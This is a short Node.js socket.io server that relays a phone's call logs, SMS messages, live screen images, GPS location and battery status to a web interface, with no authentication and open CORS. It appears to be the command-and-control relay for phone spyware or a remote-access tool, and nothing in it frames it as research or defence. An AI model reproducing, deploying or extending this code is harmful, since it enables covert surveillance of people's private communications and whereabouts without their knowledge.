const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    console.log('Client connected');

    // 1. Call Log Relay
    socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
    socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));

    // 2. Screen Mirror Relay
    socket.on('request-screen-view', () => socket.broadcast.emit('request-screen-view'));
    socket.on('stop-mirroring', () => socket.broadcast.emit('stop-mirroring'));
    // CRITICAL: Relay the raw image data to the web
    socket.on('screen-data', (data) => socket.broadcast.emit('ui-screen-stream', data));
    socket.on('screen-status', (status) => socket.broadcast.emit('screen-status', status));

    // 3. Other Relays
    socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
    socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));
    socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));
    socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));

    socket.on('disconnect', () => console.log('Client disconnected'));
});

server.listen(process.env.PORT || 3000);
